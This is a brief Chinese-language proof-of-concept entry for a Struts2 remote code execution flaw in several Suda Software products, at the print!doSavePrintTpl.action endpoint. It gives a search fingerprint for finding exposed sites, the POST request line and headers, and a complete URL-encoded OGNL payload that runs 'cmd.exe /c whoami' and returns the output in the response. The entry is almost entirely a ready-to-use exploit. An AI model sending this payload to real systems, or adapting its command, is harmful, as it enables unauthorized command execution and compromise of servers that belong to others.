# 速达软件多款产品doSavePrintTpl.actionStruts2远程代码执行漏洞

- **系统**：速达软件多款产品doSavePrintTpl.actionStruts2远程　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="速达软件技术（广州）有限公司"`
- **请求**：`POST /common/print/print!doSavePrintTpl.action HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`　`redirect: %24%7B%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%28new+java.lang.ProcessBuilder(new+java.lang.String[]{'cmd.exe','/c','whoami'})).start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23dis%3Dnew+java.io.DataInputStream%28%23b%29%2C%23buf%3Dnew+byte%5B20000%5D%2C%23dis.read%28%23buf%29%2C%23msg%3Dnew+java.lang.String%28%23buf%29%2C%23dis.close%28%29%2C%23resp.getWriter%28%29.println%28%23msg.trim%28%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29%7D=`
- **预期**：200　|　—